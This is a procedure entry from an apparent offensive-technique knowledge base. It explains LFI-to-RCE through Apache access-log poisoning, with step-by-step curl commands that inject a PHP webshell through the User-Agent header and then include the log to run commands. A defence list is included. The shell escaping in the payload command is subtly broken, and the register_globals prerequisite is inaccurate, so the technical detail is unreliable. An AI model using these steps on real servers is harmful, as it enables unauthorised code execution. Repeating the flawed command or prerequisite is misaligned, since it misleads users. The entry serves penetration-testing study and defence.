---
id: ece6eaad-3520-403d-855e-26346e1d7034
name: RCE-via-Poisoned-User-Agent-in-Apache-Logs
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:58.651243+00:00'
updated_at: '2023-04-10T20:22:16.636881+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Python]]'
sub_techniques: []
tags:
  - file-inclusion
  - lfi-to-rce
  - apache-log-poisoning
  - rce
commands:
  - '[[commands/curl-poison-apache-user-agent]]'
  - '[[commands/curl-lfi-include-apache-log]]'
platforms:
  - Linux
  - Web
tools: []
validated: true
---

# RCE-via-Poisoned-User-Agent-in-Apache-Logs

## Summary

This procedure exploits a local file inclusion (LFI) vulnerability in a PHP web application to achieve remote code execution (RCE) by poisoning the Apache access log with malicious PHP code injected via the User-Agent header. The attacker first sends an HTTP request with PHP payload in the User-Agent, which gets logged, then uses the LFI to include and execute the log file, running arbitrary commands on the server.

## Description

In scenarios where a web application is vulnerable to LFI (e.g., via a parameter like ?file= or ?page= that allows path traversal to include arbitrary files) and Apache logging is enabled with User-Agent capture, an attacker can chain these to escalate to RCE. The technique relies on the web server logging the request, including the custom User-Agent, to a predictable path like /var/log/apache2/access.log. Once poisoned, including this log via LFI parses it as PHP, executing the embedded code. This is common in misconfigured PHP apps on Linux servers running Apache. Prerequisites include knowing the log path (often discoverable via error messages or defaults) and having no WAF blocking the injection.

## Requirements

1. Network access to the vulnerable web application (typically over HTTP/HTTPS on port 80/443).
2. Identification of an LFI vulnerability allowing inclusion of server files (e.g., via ?page=/etc/passwd).
3. Knowledge of the Apache access log path (default: /var/log/apache2/access.log on Debian-based systems).
4. Ability to craft HTTP requests with custom User-Agent headers (using tools like curl).
5. Target running PHP with register_globals or similar misconfigurations that allow code execution from included files.

## Defense

- Implement strict input validation and whitelisting for file inclusion parameters to prevent path traversal.
- Disable or restrict logging of User-Agent headers if not needed, or use a WAF to filter suspicious headers containing code-like strings (e.g., <?php).
- Run web servers with least privilege, isolating logs from web-writable directories, and use mod_security or similar to block LFI patterns.
- Monitor access logs for anomalous User-Agent entries and enable PHP execution restrictions (e.g., open_basedir) to limit file inclusions.
- Regularly audit and update web applications to patch known LFI vulnerabilities.

## Objectives

1. Inject PHP code into the Apache access log via a crafted HTTP request.
2. Leverage the LFI vulnerability to include and execute the poisoned log file.
3. Achieve arbitrary command execution on the target server for further exploitation.

## Instructions

### Step 1: Poison Apache Access Log with PHP Payload

**Context**: Send an HTTP request to the target with a malicious PHP payload in the User-Agent header. This causes Apache to log the request, embedding the PHP code in the access log file. The payload should be a simple PHP webshell that executes commands passed via a GET parameter (e.g., ?cmd=).

**Command** ([[commands/curl-poison-apache-user-agent]]):
```bash
curl -A "<?php system(\\$_GET['cmd']); ?>" http://target.example.com/
```

This command sends a GET request to the root path of the target, setting the User-Agent to the PHP payload. The \\ escaping ensures the quotes are properly handled in the shell. Expected output is a standard HTTP response (e.g., 200 OK with page content), but the key effect is the log entry creation—no direct indication of poisoning in the response.

### Step 2: Include Poisoned Log via LFI to Execute Code

**Context**: Use the identified LFI vulnerability to include the access log file, which now contains the executable PHP code. Append a command parameter to trigger execution (e.g., &cmd=id to run the 'id' command). This parses the log as PHP, executing the injected code and returning the command output.

**Command** ([[commands/curl-lfi-include-apache-log]]):
```bash
curl "http://target.example.com/vuln.php?file=/var/log/apache2/access.log&cmd=id"
```

This command requests the vulnerable endpoint with the log path in the file parameter and a test command in cmd. If successful, the response will include the output of the executed command (e.g., uid=33(www-data) gid=33(www-data)). Verify by checking for command output; if no execution, confirm log path and LFI traversal (e.g., add ../ to reach /var/log).
